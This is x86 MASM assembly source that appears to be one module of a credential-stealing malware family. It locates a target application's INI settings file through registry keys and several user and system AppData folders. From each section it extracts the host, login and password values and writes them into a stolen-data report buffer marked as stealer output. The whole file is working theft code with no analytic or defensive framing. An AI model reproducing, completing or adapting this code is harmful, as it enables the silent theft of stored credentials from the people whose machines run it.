     
.data?
     wtcfilepath      db 1000h dup (?)
     wtc_env_path     db 1000h dup (?)
     wtc_sections     db 1000h dup (?)
     wtc_tmp_buf_1    db 1000h dup (?)
     wtc_inst_dir     db 200h dup (?)
     wtc_envvar       db 100h dup (?)
     wtc_sect_data1   db MAX_PATH dup (?)
     wtc_sect_data2   db MAX_PATH dup (?)
     wtc_sect_data3   db MAX_PATH dup (?)
     
     
.code

WTC_RegScan proc hkey:DWORD
      invoke  RegRead, hkey, addr wtc_path, addr wtc_val, addr wtcfilepath, sizeof wtcfilepath, REG_READ_A
      test    eax, eax
      je      wtc_really_shit
 
      lstrlen, addr wtcfilepath
      test    eax, eax
      je      wtc_really_shit
      
      mov     al, byte ptr [wtcfilepath]
      .if     al == '%'
              lstrlen, addr wtcfilepath
              push    eax
              lstrlen, addr percent
              push    eax
              push    offset wtcfilepath
              push    offset percent
              call    strpos
              mov     ebx, eax
              lstrlen, addr wtcfilepath + 1
              push    eax
              lstrlen, addr percent
              push    eax
              push    offset wtcfilepath + 1
              push    offset percent
              call    strpos
              push    eax
              add     ebx, 1
              sub     eax, ebx
              add     eax, 1
              lstrcpyn, addr wtc_envvar, ebx, eax
              GetEnvironmentVariable, addr wtc_envvar, addr wtc_env_path, sizeof wtc_env_path
              pop     eax
              add     eax, 1
              lstrcat, addr wtc_env_path, eax
              lstrcpy, addr wtcfilepath, addr wtc_env_path
      .elseif al == '.'
              push    offset wtc_inst_dir
              call    dword ptr [_PathAddBackslash]
              lstrcpy, addr wtc_tmp_buf_1, addr wtc_inst_dir
              lstrcat, addr wtc_tmp_buf_1, addr wtcfilepath; + 2
              lstrcpy, addr wtcfilepath, addr wtc_tmp_buf_1
      .endif
      
      push    offset wtcfilepath
      call    WTC_ProcessFile
      
    wtc_really_shit:
      ret
WTC_RegScan endp

WTCRecCallback proc lpPath:DWORD, lpFilename:DWORD
      lstrcmp, addr wtc_file1, lpFilename
      .if     eax == 0
              jmp     wtc_good_file
      .endif
      jmp     wtc_mapping_error
    wtc_good_file:
      push    lpPath
      call    _PathFindFileName
      mov     byte ptr [eax], 0
      lstrcat, lpPath, lpFilename
      
      push    dword ptr [lpPath]
      call    WTC_ProcessFile
      
    wtc_mapping_error:
      ret
WTCRecCallback endp

WTC_ProcessFile proc lpPath:DWORD
      GetPrivateProfileSectionNames, addr wtc_sections, sizeof wtc_sections, lpPath
      
      mov     ebx, offset wtc_sections
    wtc_section_lp:
      lstrlen, ebx
      test    eax, eax
      je      all_sections_done
      
      GetPrivateProfileString, ebx, addr WTCIniStr1, 0, addr wtc_sect_data1, sizeof wtc_sect_data1, lpPath
      test    eax, eax
      je      wtc_next_section
      GetPrivateProfileString, ebx, addr WTCIniStr2, 0, addr wtc_sect_data2, sizeof wtc_sect_data2, lpPath
      test    eax, eax
      je      wtc_next_section
      GetPrivateProfileString, ebx, addr WTCIniStr3, 0, addr wtc_sect_data3, sizeof wtc_sect_data1, lpPath
      test    eax, eax
      je      wtc_next_section
      
      lstrlen, addr wtc_sect_data1
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_HOST
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr wtc_sect_data1, plen, addr SNW, NULL
      
      lstrlen, addr wtc_sect_data2
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_LOGIN
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr wtc_sect_data2, plen, addr SNW, NULL
      
      lstrlen, addr wtc_sect_data3
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_PWD
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr wtc_sect_data3, plen, addr SNW, NULL
      
    wtc_next_section:
      lstrlen, ebx
      add     ebx, eax
      add     ebx, 1
      jmp     wtc_section_lp
    all_sections_done:
      ret
WTC_ProcessFile endp

GetWTCPwd proc
      LOCAL   WTF:DWORD
      
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], WTC_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetWTCPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      push    HKEY_LOCAL_MACHINE
      call    WTC_RegScan
      
      push    HKEY_CURRENT_USER
      call    WTC_RegScan
      
      ; appdata shit #1
      push    0
      push    CSIDL_APPDATA
      push    offset wtcfilepath
      push    0
      call    _SHGetSpecialFolderPath
      push    offset wtcfilepath
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr wtcfilepath, addr wtc_path1
      mov     recursive_index, 0
      push    offset WTCRecCallback
      push    offset wtcfilepath
      call    SomeRecursiveFunc
      
      ; appdata shit #2
      push    0
      push    CSIDL_COMMON_APPDATA
      push    offset wtcfilepath
      push    0
      call    _SHGetSpecialFolderPath
      push    offset wtcfilepath
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr wtcfilepath, addr wtc_path1
      mov     recursive_index, 0
      push    offset WTCRecCallback
      push    offset wtcfilepath
      call    SomeRecursiveFunc
      
      ; appdata shit #3
      push    0
      push    CSIDL_LOCAL_APPDATA
      push    offset wtcfilepath
      push    0
      call    _SHGetSpecialFolderPath
      push    offset wtcfilepath
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr wtcfilepath, addr wtc_path1
      mov     recursive_index, 0
      push    offset WTCRecCallback
      push    offset wtcfilepath
      call    SomeRecursiveFunc
      
      ; appdata shit #4
      push    0
      push    CSIDL_PROFILE
      push    offset wtcfilepath
      push    0
      call    _SHGetSpecialFolderPath
      push    offset wtcfilepath
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr wtcfilepath, addr wtc_path1
      mov     recursive_index, 0
      push    offset WTCRecCallback
      push    offset wtcfilepath
      call    SomeRecursiveFunc
      
    GetWTCPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetWTCPwd endp
